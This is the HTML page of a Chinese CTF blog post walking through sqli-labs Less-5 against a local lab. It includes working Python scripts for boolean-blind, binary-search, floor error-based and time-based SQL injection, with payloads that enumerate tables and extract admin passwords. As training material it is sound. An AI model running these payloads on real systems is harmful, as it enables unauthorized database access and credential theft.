@@ -1,0 +1,521 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.1.1">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <meta name="google-site-verification" content="https://yoyo2yong.xyz">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"www.yoyo2tong.xyz","root":"/","scheme":"Pisces","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="前言：sql注入是ctf比赛中的一大考点，借助这道题复习一下sql注入，使用三种方法解答这道题，主要练习编写sql注入脚本。 判断注入类型用sqlmap判断注入类型，可以看到这道题有三种解题方法，分别是布尔盲注，报错注入，以及延时注入。 1python sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&amp;#x">
+<meta property="og:type" content="article">
+<meta property="og:title" content="细说sqli_labs Less-5">
+<meta property="og:url" content="http://www.yoyo2tong.xyz/2021/02/26/%E7%BB%86%E8%AF%B4sqli_labs%20Less-5/index.html">
+<meta property="og:site_name" content="zoey">
+<meta property="og:description" content="前言：sql注入是ctf比赛中的一大考点，借助这道题复习一下sql注入，使用三种方法解答这道题，主要练习编写sql注入脚本。 判断注入类型用sqlmap判断注入类型，可以看到这道题有三种解题方法，分别是布尔盲注，报错注入，以及延时注入。 1python sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&amp;#x">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/1.png">
+<meta property="og:image" content="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/2.png">
+<meta property="og:image" content="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/3.png">
+<meta property="og:image" content="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/4.png">
+<meta property="og:image" content="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/5.png">
+<meta property="og:image" content="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/6.png">
+<meta property="og:image" content="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/7.png">
+<meta property="og:image" content="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/8.png">
+<meta property="og:image" content="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/9.png">
+<meta property="og:image" content="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/10.png">
+<meta property="og:image" content="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/11.png">
+<meta property="og:image" content="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/12.png">
+<meta property="og:image" content="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/13.png">
+<meta property="og:image" content="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/14.png">
+<meta property="og:image" content="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/15.png">
+<meta property="article:published_time" content="2021-02-26T02:22:23.823Z">
+<meta property="article:modified_time" content="2021-03-21T08:53:57.308Z">
+<meta property="article:author" content="zoey">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/1.png">
+
+<link rel="canonical" href="http://www.yoyo2tong.xyz/2021/02/26/%E7%BB%86%E8%AF%B4sqli_labs%20Less-5/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>细说sqli_labs Less-5 | zoey</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="zoey" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">zoey</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">请多指教！</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://www.yoyo2tong.xyz/2021/02/26/%E7%BB%86%E8%AF%B4sqli_labs%20Less-5/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="zoey">
+      <meta itemprop="description" content="Hello!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="zoey">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          细说sqli_labs Less-5
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2021-02-26 10:22:23" itemprop="dateCreated datePublished" datetime="2021-02-26T10:22:23+08:00">2021-02-26</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-03-21 16:53:57" itemprop="dateModified" datetime="2021-03-21T16:53:57+08:00">2021-03-21</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.8k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>前言：sql注入是ctf比赛中的一大考点，借助这道题复习一下sql注入，使用三种方法解答这道题，主要练习编写sql注入脚本。</p>
+<h2 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h2><p>用sqlmap判断注入类型，可以看到这道题有三种解题方法，分别是布尔盲注，报错注入，以及延时注入。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;sqli&#x2F;Less-5&#x2F;?id&#x3D;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/1.png"></p>
+<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/2.png"></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/3.png"></p>
+<p>通过报错<code>&quot;1&quot;LIMIT 0,1&#39;</code>，可以推出我们输入的内容构成的查询语句为<code>&#39;1&quot;LIMIT 0,1</code>，可以看出id是用一对单引号闭合的，我们输入1‘导致报错。</p>
+<h3 id="绕过报错"><a href="#绕过报错" class="headerlink" title="绕过报错"></a>绕过报错</h3><p>我们输入一个单引号与后面的一个单引号结合导致报错，猜想如果我们把后面的单引号注释掉就可以绕过报错。</p>
+<p>查看mysql写注释的方法，有三种</p>
+<ul>
+<li>#</li>
+<li>–+(–空格)</li>
+<li>/**/    适用于多行注释</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from flag;#select database();</span><br><span class="line">+--------------------+</span><br><span class="line">| flag               |</span><br><span class="line">+--------------------+</span><br><span class="line">| flag&#123;flag is here&#125; |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">    -&gt; </span><br><span class="line">    -&gt; ;</span><br><span class="line">Query OK, 0 rows affected</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from flag;-- select database();</span><br><span class="line">+--------------------+</span><br><span class="line">| flag               |</span><br><span class="line">+--------------------+</span><br><span class="line">| flag&#123;flag is here&#125; |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">    -&gt; ;</span><br><span class="line">Query OK, 0 rows affected</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mysql&gt; select * from flag;&#x2F;*select database();*&#x2F;</span><br><span class="line">+--------------------+</span><br><span class="line">| flag               |</span><br><span class="line">+--------------------+</span><br><span class="line">| flag&#123;flag is here&#125; |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">    -&gt; select * from flag;&#x2F;*select database();*&#x2F;;</span><br><span class="line">+--------------------+</span><br><span class="line">| flag               |</span><br><span class="line">+--------------------+</span><br><span class="line">| flag&#123;flag is here&#125; |</span><br><span class="line">+--------------------+</span><br><span class="line">1 row in set</span><br><span class="line"></span><br><span class="line">Query OK, 0 rows affected</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/4.png"></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/5.png"></p>
+<p>我们可以看到使用–空格可以绕过报错，而使用#不能绕过报错。我们打开burpsuit分析，可以发现#显示黑色，也就是说#没有成功进入url访问，导致无法绕过。但用#的url编码%23可以绕过。</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/6.png"></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/7.png"></p>
+<h3 id="BurpSuite爆破"><a href="#BurpSuite爆破" class="headerlink" title="BurpSuite爆破"></a>BurpSuite爆破</h3><p>当我们输入的语句正确且我们判断正确时，会返回<code>You are in ...</code>的界面，当我们输入的语句正确且判断语句错误时会返回空白。据此，我们可以通过返回的页面来查看我们的判断语句是否正确。</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/8.png"></p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/9.png"></p>
+<p>这里先介绍几个函数的用法</p>
+<p>substr()函数返回字符串的一小部分，substr(string,start,length)（length为1，即从第一个字母开始）</p>
+<p>limit的使用格式为limitm,n，其中m是指记录开始的位置，n是指取几条记录。（第一条记录是从0开始）</p>
+<p>ascii(str): str是一个字符串参数，返回值字符串的ascii码。</p>
+<p>timeout：设定超时时间，秒为单位,在设定时间内没有返回内容则返回一个timeout异常</p>
+<p>下面开始进行爆破，爆破的顺序是数据库名，表名，字段名，字段值。</p>
+<p>爆破数据库的第一个字符，返回空白，即第一个字符不是a。</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/10.png"></p>
+<p>可以使用burpsuit的intruder模块对字符a进行爆破。</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/11.png"></p>
+<p>从这个例子可以看到，数据库的第一个字母为s，且mysql对字母大小写不敏感。但使用这种方法速度较低，我们可以直接爆破整个数据库名。</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/12.png"></p>
+<p>第一个爆破的数字为数字，设置为1到10；第二个爆破的数字为字符，字典为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abcdefghijklmnopqrstuvwxyz1234567890!@#$%^&amp;*()-&#x3D;_;&#39;,.&#39;&lt;&gt;?&#96;~\|&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/13.png"></p>
+<p>通过爆破我们可以简单看出，数据库名为secrity</p>
+<p>使用这个方法较为简单，但是所花的时间相对较长，在ctf比赛中，该方法并不是为最优的，下面介绍使用脚本破解。</p>
+<h3 id="简单脚本"><a href="#简单脚本" class="headerlink" title="简单脚本"></a>简单脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">tables = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz123456789!@#$Z%^&amp;*()\][;&#x27;.,/`·-=&#x27;]&quot;</span></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> tables:</span><br><span class="line">    		url = <span class="string">&quot;http://127.0.0.1/sqli/Less-5/?id=1&#x27; and substr(database(),%d,1)=&#x27;%s&#x27;--+&quot;</span>%(j,i)</span><br><span class="line">    		r=requests.get(url)</span><br><span class="line">    		<span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        		s=s+i</span><br><span class="line">        		print(s)</span><br><span class="line">        		<span class="keyword">break</span></span><br><span class="line">                </span><br><span class="line">  <span class="comment">#database()=security</span></span><br></pre></td></tr></table></figure>
+
+<p>爆破表名的url为</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&quot;http://127.0.0.1/sqli/Less-5/?id=1&#x27; and substr((select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#x27;security&#x27; limit 1,1),%d,1)=&#x27;%s&#x27;--+&quot;</span>%(j,i)</span><br><span class="line"></span><br><span class="line"><span class="comment">#第一个表名 admin</span></span><br><span class="line"><span class="comment">#第二个表名 emails</span></span><br><span class="line"><span class="comment">#第三个表名 student</span></span><br><span class="line"><span class="comment">#第四个表名 uagents</span></span><br></pre></td></tr></table></figure>
+
+<p>爆破字段名的url</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">url = http://127.0.0.1/sqli/Less-5/?id=1&#x27; and substr(( select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;admin&#x27; limit 2,1),%d,1)=&#x27;%s&#x27;--+&quot;%(j,i)</span><br><span class="line"></span><br><span class="line"><span class="comment">#admin 有三个字段名 id,username,password</span></span><br></pre></td></tr></table></figure>
+
+<p>爆破字段值的url</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&quot;http://127.0.0.1/sqli/Less-5/?id=1&#x27; and substr(( select id from admin limit 0,1),%d,1)=&#x27;%s&#x27;--+&quot;</span>%(j,i)</span><br></pre></td></tr></table></figure>
+
+<p>完整脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">tables = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz123456789&quot;</span></span><br><span class="line"><span class="comment">#爆数据库名</span></span><br><span class="line">pay = <span class="string">&#x27;database()&#x27;</span></span><br><span class="line"><span class="comment">#爆表</span></span><br><span class="line"><span class="comment">#pay = &quot;(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#x27;security&#x27; limit 1,1)&quot;</span></span><br><span class="line"><span class="comment">#爆字段名</span></span><br><span class="line"><span class="comment">#pay= &quot;( select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;admin&#x27; limit 2,1)&quot;</span></span><br><span class="line"><span class="comment">#爆字段值</span></span><br><span class="line"><span class="comment">#pay = &quot;(select password from admin limit 0,1)&quot;</span></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> tables:</span><br><span class="line">    		url = <span class="string">&quot;http://127.0.0.1/sqli/Less-5/?id=1&#x27; and substr(&quot;</span>+pay+<span class="string">&quot;,%d,1)=&#x27;%s&#x27;--+&quot;</span>%(j,i)</span><br><span class="line">    		r=requests.get(url)</span><br><span class="line">    		<span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        		s=s+i</span><br><span class="line">        		print(s)</span><br><span class="line">        		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="二分法脚本"><a href="#二分法脚本" class="headerlink" title="二分法脚本"></a>二分法脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="comment">#爆数据库名</span></span><br><span class="line">pay = <span class="string">&#x27;database()&#x27;</span></span><br><span class="line"><span class="comment">#爆表</span></span><br><span class="line"><span class="comment">#pay = &quot;(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#x27;security&#x27; limit 1,1)&quot;</span></span><br><span class="line"><span class="comment">#爆字段名</span></span><br><span class="line"><span class="comment">#pay= &quot;( select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;admin&#x27; limit 2,1)&quot;</span></span><br><span class="line"><span class="comment">#爆字段值</span></span><br><span class="line"><span class="comment">#pay = &quot;(select password from admin limit 0,1)&quot;</span></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="comment">#for j in range(1,10):</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">10</span>):</span><br><span class="line">	high = <span class="number">127</span></span><br><span class="line">	low = <span class="number">32</span></span><br><span class="line">	mid = (low + high) // <span class="number">2</span></span><br><span class="line">	<span class="keyword">while</span> high &gt; low:</span><br><span class="line">				url = <span class="string">&quot;http://127.0.0.1/sqli/Less-5/?id=1&#x27; and ascii(substr(&quot;</span>+pay+<span class="string">&quot;,%d,1))&lt;=&#x27;%s&#x27;--+&quot;</span>%(i,mid)</span><br><span class="line">				r=requests.get(url)</span><br><span class="line">				<span class="keyword">if</span> <span class="string">&quot;You are in&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">					high = mid</span><br><span class="line">				<span class="keyword">else</span>:</span><br><span class="line">					low = mid+<span class="number">1</span></span><br><span class="line">				mid = (low + high) // <span class="number">2</span></span><br><span class="line">	s += chr(int(mid))</span><br><span class="line">	print(s)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>SQL报错注入就是利用数据库的某些查询报错的机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。</p>
+<p>这里我们使用floor报错来解题。（floor报错原理这里不再叙述）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="comment">#爆数据库</span></span><br><span class="line">pay=<span class="string">&quot;database()&quot;</span></span><br><span class="line"><span class="comment">#爆表</span></span><br><span class="line"><span class="comment">#pay = &quot;(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#x27;security&#x27; limit 1,1)&quot;</span></span><br><span class="line"><span class="comment">#爆字段名</span></span><br><span class="line"><span class="comment">#pay= &quot;( select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;admin&#x27; limit 2,1)&quot;</span></span><br><span class="line"><span class="comment">#爆字段值</span></span><br><span class="line"><span class="comment">#pay = &quot;(select password from admin limit 0,1)&quot;</span></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1/sqli/Less-5/?id=1%27%20and id=1 and (select 1 from (select count(*),concat(&quot;</span>+pay+<span class="string">&quot;,floor(rand(0)*2))x from information_schema.tables group by x)a) --+;&quot;</span></span><br><span class="line">r=requests.get(url)</span><br><span class="line">print(re.findall(<span class="string">&quot;Duplicate entry &#x27;(.*?)1&#x27; for key&quot;</span>,r.text))</span><br></pre></td></tr></table></figure>
+
+<h2 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h2><p>当判断错误时，1秒多就返回页面。</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/14.png"></p>
+<p>当判断正确时，会休眠5秒后再返回页面，也就6秒多才返回页面。</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/blog/Less-5/15.png"></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">tables = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz123456789!@#$%^&amp;*()_+&#123;&#125;|?&gt;&lt;&quot;</span></span><br><span class="line"><span class="comment">#爆数据库名</span></span><br><span class="line">pay = <span class="string">&#x27;database()&#x27;</span></span><br><span class="line"><span class="comment">#爆表</span></span><br><span class="line"><span class="comment">#pay = &quot;(select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA=&#x27;security&#x27; limit 1,1)&quot;</span></span><br><span class="line"><span class="comment">#爆字段名</span></span><br><span class="line"><span class="comment">#pay= &quot;( select COLUMN_NAME from information_schema.COLUMNS where TABLE_NAME=&#x27;admin&#x27; limit 2,1)&quot;</span></span><br><span class="line"><span class="comment">#爆字段值</span></span><br><span class="line"><span class="comment">#pay = &quot;(select password from admin limit 0,1)&quot;</span></span><br><span class="line">s = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">10</span>):</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> tables:</span><br><span class="line">    		url = <span class="string">&quot;http://127.0.0.1/sqli/Less-5/?id=1&#x27; and if(substr(&quot;</span>+pay+<span class="string">&quot;,%d,1)=&#x27;%s&#x27;,sleep(5),0)--+&quot;</span>%(j,i)</span><br><span class="line">    </span><br><span class="line">    		<span class="keyword">try</span>:</span><br><span class="line">    			r=requests.get(url=url,timeout=<span class="number">3</span>)</span><br><span class="line">    			<span class="comment">#print(url)</span></span><br><span class="line">    		<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        		s=s+i</span><br><span class="line">        		print(s)</span><br><span class="line">        		<span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/02/03/%E6%B5%85%E8%B0%88md5%E5%BC%B1%E7%B1%BB%E5%9E%8B%E6%AF%94%E8%BE%83%E5%92%8C%E5%BC%BA%E7%A2%B0%E6%92%9E/" rel="prev" title="浅析md5弱类型比较和强碰撞">
+      <i class="fa fa-chevron-left"></i> 浅析md5弱类型比较和强碰撞
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
